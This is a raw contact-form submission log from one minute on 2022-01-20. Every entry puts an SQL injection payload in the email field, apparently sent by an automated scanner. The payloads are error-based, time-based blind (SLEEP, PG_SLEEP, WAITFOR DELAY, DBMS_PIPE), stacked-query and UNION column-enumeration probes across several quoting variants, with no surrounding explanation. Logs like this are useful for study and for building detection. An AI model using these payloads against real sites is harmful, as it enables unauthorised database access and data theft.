+++ 2022-01-20 05:42:20 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND (5742=5742, -- Message is: 
+++ 2022-01-20 05:42:20 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL), -- Message is: 
+++ 2022-01-20 05:42:21 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- uVcM, -- Message is: 
+++ 2022-01-20 05:42:21 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND ('CHCK'='CHCK, -- Message is: 
+++ 2022-01-20 05:42:21 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND 'sNLv'='sNLv, -- Message is: 
+++ 2022-01-20 05:42:22 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 3214=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3214=3214) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:22 AM -- Email from: 1, -- subject: 1, -- email: (SELECT 3882 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(3882=3882,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- Message is: 
+++ 2022-01-20 05:42:23 AM -- Email from: 1, -- subject: 1, -- email: (SELECT CONCAT(0x7176767071,(SELECT (ELT(2603=2603,1))),0x7171767171)), -- Message is: 
+++ 2022-01-20 05:42:23 AM -- Email from: 1, -- subject: 1, -- email: (SELECT (CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3185=3185) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113))), -- Message is: 
+++ 2022-01-20 05:42:24 AM -- Email from: 1, -- subject: 1, -- email: (SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (4567=4567) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)), -- Message is: 
+++ 2022-01-20 05:42:24 AM -- Email from: 1, -- subject: 1, -- email: 1);SELECT SLEEP(5)#, -- Message is: 
+++ 2022-01-20 05:42:25 AM -- Email from: 1, -- subject: 1, -- email: 1;SELECT SLEEP(5)#, -- Message is: 
+++ 2022-01-20 05:42:25 AM -- Email from: 1, -- subject: 1, -- email: 1');SELECT SLEEP(5)#, -- Message is: 
+++ 2022-01-20 05:42:25 AM -- Email from: 1, -- subject: 1, -- email: 1';SELECT SLEEP(5)#, -- Message is: 
+++ 2022-01-20 05:42:26 AM -- Email from: 1, -- subject: 1, -- email: 1%';SELECT SLEEP(5)#, -- Message is: 
+++ 2022-01-20 05:42:26 AM -- Email from: 1, -- subject: 1, -- email: 1);SELECT PG_SLEEP(5)--, -- Message is: 
+++ 2022-01-20 05:42:27 AM -- Email from: 1, -- subject: 1, -- email: 1;SELECT PG_SLEEP(5)--, -- Message is: 
+++ 2022-01-20 05:42:27 AM -- Email from: 1, -- subject: 1, -- email: 1');SELECT PG_SLEEP(5)--, -- Message is: 
+++ 2022-01-20 05:42:28 AM -- Email from: 1, -- subject: 1, -- email: 1';SELECT PG_SLEEP(5)--, -- Message is: 
+++ 2022-01-20 05:42:28 AM -- Email from: 1, -- subject: 1, -- email: 1%';SELECT PG_SLEEP(5)--, -- Message is: 
+++ 2022-01-20 05:42:28 AM -- Email from: 1, -- subject: 1, -- email: 1);WAITFOR DELAY '0:0:5'--, -- Message is: 
+++ 2022-01-20 05:42:29 AM -- Email from: 1, -- subject: 1, -- email: 1;WAITFOR DELAY '0:0:5'--, -- Message is: 
+++ 2022-01-20 05:42:29 AM -- Email from: 1, -- subject: 1, -- email: 1');WAITFOR DELAY '0:0:5'--, -- Message is: 
+++ 2022-01-20 05:42:30 AM -- Email from: 1, -- subject: 1, -- email: 1';WAITFOR DELAY '0:0:5'--, -- Message is: 
+++ 2022-01-20 05:42:30 AM -- Email from: 1, -- subject: 1, -- email: 1%';WAITFOR DELAY '0:0:5'--, -- Message is: 
+++ 2022-01-20 05:42:31 AM -- Email from: 1, -- subject: 1, -- email: 1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(104)||CHR(117)||CHR(102),5) FROM DUAL--, -- Message is: 
+++ 2022-01-20 05:42:31 AM -- Email from: 1, -- subject: 1, -- email: 1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(104)||CHR(117)||CHR(102),5) FROM DUAL--, -- Message is: 
+++ 2022-01-20 05:42:31 AM -- Email from: 1, -- subject: 1, -- email: 1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(104)||CHR(117)||CHR(102),5) FROM DUAL--, -- Message is: 
+++ 2022-01-20 05:42:32 AM -- Email from: 1, -- subject: 1, -- email: 1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(104)||CHR(117)||CHR(102),5) FROM DUAL--, -- Message is: 
+++ 2022-01-20 05:42:32 AM -- Email from: 1, -- subject: 1, -- email: 1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(104)||CHR(117)||CHR(102),5) FROM DUAL--, -- Message is: 
+++ 2022-01-20 05:42:33 AM -- Email from: 1, -- subject: 1, -- email: 1) AND SLEEP(5) AND (9653=9653, -- Message is: 
+++ 2022-01-20 05:42:33 AM -- Email from: 1, -- subject: 1, -- email: 1 AND SLEEP(5), -- Message is: 
+++ 2022-01-20 05:42:34 AM -- Email from: 1, -- subject: 1, -- email: 1 AND SLEEP(5)-- eAai, -- Message is: 
+++ 2022-01-20 05:42:34 AM -- Email from: 1, -- subject: 1, -- email: 1') AND SLEEP(5) AND ('yDpQ'='yDpQ, -- Message is: 
+++ 2022-01-20 05:42:34 AM -- Email from: 1, -- subject: 1, -- email: 1' AND SLEEP(5) AND 'dxhd'='dxhd, -- Message is: 
+++ 2022-01-20 05:42:35 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND SLEEP(5) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:35 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 5661=(SELECT 5661 FROM PG_SLEEP(5)) AND (3752=3752, -- Message is: 
+++ 2022-01-20 05:42:36 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 5661=(SELECT 5661 FROM PG_SLEEP(5)), -- Message is: 
+++ 2022-01-20 05:42:36 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 5661=(SELECT 5661 FROM PG_SLEEP(5))-- uAUf, -- Message is: 
+++ 2022-01-20 05:42:37 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 5661=(SELECT 5661 FROM PG_SLEEP(5)) AND ('hfCd'='hfCd, -- Message is: 
+++ 2022-01-20 05:42:37 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 5661=(SELECT 5661 FROM PG_SLEEP(5)) AND 'CJRi'='CJRi, -- Message is: 
+++ 2022-01-20 05:42:37 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 5661=(SELECT 5661 FROM PG_SLEEP(5)) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:38 AM -- Email from: 1, -- subject: 1, -- email: 1) WAITFOR DELAY '0:0:5' AND (9290=9290, -- Message is: 
+++ 2022-01-20 05:42:38 AM -- Email from: 1, -- subject: 1, -- email: 1 WAITFOR DELAY '0:0:5', -- Message is: 
+++ 2022-01-20 05:42:39 AM -- Email from: 1, -- subject: 1, -- email: 1 WAITFOR DELAY '0:0:5'-- dagE, -- Message is: 
+++ 2022-01-20 05:42:39 AM -- Email from: 1, -- subject: 1, -- email: 1') WAITFOR DELAY '0:0:5' AND ('fvUb'='fvUb, -- Message is: 
+++ 2022-01-20 05:42:39 AM -- Email from: 1, -- subject: 1, -- email: 1' WAITFOR DELAY '0:0:5' AND 'bpej'='bpej, -- Message is: 
+++ 2022-01-20 05:42:40 AM -- Email from: 1, -- subject: 1, -- email: 1%' WAITFOR DELAY '0:0:5' AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:40 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5) AND (5100=5100, -- Message is: 
+++ 2022-01-20 05:42:41 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5), -- Message is: 
+++ 2022-01-20 05:42:41 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5)-- YDWt, -- Message is: 
+++ 2022-01-20 05:42:42 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5) AND ('eUwX'='eUwX, -- Message is: 
+++ 2022-01-20 05:42:42 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5) AND 'OHXH'='OHXH, -- Message is: 
+++ 2022-01-20 05:42:42 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 6524=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(89)||CHR(73)||CHR(69),5) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:43 AM -- Email from: 1, -- subject: 1, -- email: 1) ORDER BY 1-- KQgM, -- Message is: 
+++ 2022-01-20 05:42:43 AM -- Email from: 1, -- subject: 1, -- email: 1) ORDER BY 5187-- dxux, -- Message is: 
+++ 2022-01-20 05:42:44 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL-- lwdw, -- Message is: 
+++ 2022-01-20 05:42:44 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL-- tRbD, -- Message is: 
+++ 2022-01-20 05:42:45 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL-- zpGo, -- Message is: 
+++ 2022-01-20 05:42:45 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL-- iwjN, -- Message is: 
+++ 2022-01-20 05:42:45 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ojUb, -- Message is: 
+++ 2022-01-20 05:42:46 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- UCJX, -- Message is: 
+++ 2022-01-20 05:42:46 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IPJs, -- Message is: 
+++ 2022-01-20 05:42:47 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iAfo, -- Message is: 
+++ 2022-01-20 05:42:47 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dnDo, -- Message is: 
+++ 2022-01-20 05:42:48 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qUfv, -- Message is: 
+++ 2022-01-20 05:42:48 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 1-- OpjJ, -- Message is: 
+++ 2022-01-20 05:42:49 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 2652-- vJfV, -- Message is: 
+++ 2022-01-20 05:42:49 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL-- IsLU, -- Message is: 
+++ 2022-01-20 05:42:49 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL-- eBIV, -- Message is: 
+++ 2022-01-20 05:42:50 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL-- xYFn, -- Message is: 
+++ 2022-01-20 05:42:50 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- dQxP, -- Message is: 
+++ 2022-01-20 05:42:51 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- benx, -- Message is: 
+++ 2022-01-20 05:42:51 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ulFH, -- Message is: 
+++ 2022-01-20 05:42:52 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VLbO, -- Message is: 
+++ 2022-01-20 05:42:52 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- umwy, -- Message is: 
+++ 2022-01-20 05:42:52 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NKjo, -- Message is: 
+++ 2022-01-20 05:42:53 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BlrQ, -- Message is: 
+++ 2022-01-20 05:42:53 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 1-- KLuW, -- Message is: 
+++ 2022-01-20 05:42:54 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 6344-- qcly, -- Message is: 
+++ 2022-01-20 05:42:54 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL-- svNt, -- Message is: 
+++ 2022-01-20 05:42:55 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL-- ENuk, -- Message is: 
+++ 2022-01-20 05:42:55 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL-- ySWy, -- Message is: 
+++ 2022-01-20 05:42:55 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- ivyI, -- Message is: 
+++ 2022-01-20 05:42:56 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ceFq, -- Message is: 
+++ 2022-01-20 05:42:56 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- nAed, -- Message is: 
+++ 2022-01-20 05:42:57 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nfSc, -- Message is: 
+++ 2022-01-20 05:42:57 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wgDz, -- Message is: 
+++ 2022-01-20 05:42:58 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UcJU, -- Message is: 
+++ 2022-01-20 05:42:58 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mzlj, -- Message is: 
+++ 2022-01-20 05:42:58 AM -- Email from: 1, -- subject: 1, -- email: 1') ORDER BY 1-- ugBz, -- Message is: 
+++ 2022-01-20 05:42:59 AM -- Email from: 1, -- subject: 1, -- email: 1') ORDER BY 7270-- MNCV, -- Message is: 
+++ 2022-01-20 05:42:59 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL-- vbuM, -- Message is: 
+++ 2022-01-20 05:43:00 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL-- ENzc, -- Message is: 
+++ 2022-01-20 05:43:00 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL-- kTCS, -- Message is: 
+++ 2022-01-20 05:43:01 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL-- aMoA, -- Message is: 
+++ 2022-01-20 05:43:01 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- auxj, -- Message is: 
+++ 2022-01-20 05:43:01 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- SixE, -- Message is: 
+++ 2022-01-20 05:43:02 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- yiBl, -- Message is: 
+++ 2022-01-20 05:43:02 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DWPE, -- Message is: 
+++ 2022-01-20 05:43:03 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CVYc, -- Message is: 
+++ 2022-01-20 05:43:03 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xdMI, -- Message is: 
+++ 2022-01-20 05:43:04 AM -- Email from: 1, -- subject: 1, -- email: 1' ORDER BY 1-- njSP, -- Message is: 
+++ 2022-01-20 05:43:04 AM -- Email from: 1, -- subject: 1, -- email: 1' ORDER BY 4093-- QHlx, -- Message is: 
+++ 2022-01-20 05:43:04 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL-- hwzN, -- Message is: 
+++ 2022-01-20 05:43:05 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL-- OSwc, -- Message is: 
+++ 2022-01-20 05:43:05 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL-- WFdV, -- Message is: 
+++ 2022-01-20 05:43:06 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL-- bXkj, -- Message is: 
+++ 2022-01-20 05:43:06 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- kuVb, -- Message is: 
+++ 2022-01-20 05:43:07 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- cpZo, -- Message is: 
+++ 2022-01-20 05:43:07 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ITxm, -- Message is: 
+++ 2022-01-20 05:43:07 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GqWH, -- Message is: 
+++ 2022-01-20 05:43:08 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GvOq, -- Message is: 
+++ 2022-01-20 05:43:08 AM -- Email from: 1, -- subject: 1, -- email: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TNuq, -- Message is: 
+++ 2022-01-20 05:43:09 AM -- Email from: 1, -- subject: 1, -- email: 1%' ORDER BY 1-- sqcM, -- Message is: 
+++ 2022-01-20 05:43:16 AM -- Email from: 1, -- subject: 1, -- email: 1%' ORDER BY 7825-- fFsl, -- Message is: 
+++ 2022-01-20 05:43:16 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL-- cGpR, -- Message is: 
+++ 2022-01-20 05:43:16 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL-- ymEz, -- Message is: 
+++ 2022-01-20 05:43:17 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL-- RxZu, -- Message is: 
+++ 2022-01-20 05:43:17 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- sSFb, -- Message is: 
+++ 2022-01-20 05:43:18 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- rYtA, -- Message is: 
+++ 2022-01-20 05:43:18 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- MUfh, -- Message is: 
+++ 2022-01-20 05:43:19 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Neyl, -- Message is: 
+++ 2022-01-20 05:43:19 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cWtX, -- Message is: 
+++ 2022-01-20 05:43:19 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNKg, -- Message is: 
+++ 2022-01-20 05:43:20 AM -- Email from: 1, -- subject: 1, -- email: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Xnhf, -- Message is: 
+++ 2022-01-20 05:43:20 AM -- Email from: 1, -- subject: 1, -- email: 1) ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:21 AM -- Email from: 1, -- subject: 1, -- email: 1) ORDER BY 2798#, -- Message is: 
+++ 2022-01-20 05:43:21 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:22 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:22 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:22 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:23 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:23 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:24 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:24 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:25 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:25 AM -- Email from: 1, -- subject: 1, -- email: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:25 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:26 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 3031#, -- Message is: 
+++ 2022-01-20 05:43:26 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:27 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:27 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:27 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:28 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:28 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:29 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:29 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:30 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:30 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:30 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:31 AM -- Email from: 1, -- subject: 1, -- email: 1 ORDER BY 2240#, -- Message is: 
+++ 2022-01-20 05:43:31 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:32 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:32 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:33 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:33 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:33 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:34 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:34 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:35 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:35 AM -- Email from: 1, -- subject: 1, -- email: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- Message is: 
+++ 2022-01-20 05:43:35 AM -- Email from: 1, -- subject: 1, -- email: 1') ORDER BY 1#, -- Message is: 
+++ 2022-01-20 05:43:36 AM -- Email from: 1, -- subject: 1, -- email: 1') ORDER BY 5160#, -- Message is: 
+++ 2022-01-20 05:43:36 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL#, -- Message is: 
+++ 2022-01-20 05:43:37 AM -- Email from: 1, -- subject: 1, -- email: 1') UNION ALL SELECT NULL,NULL#, -- Message is: 
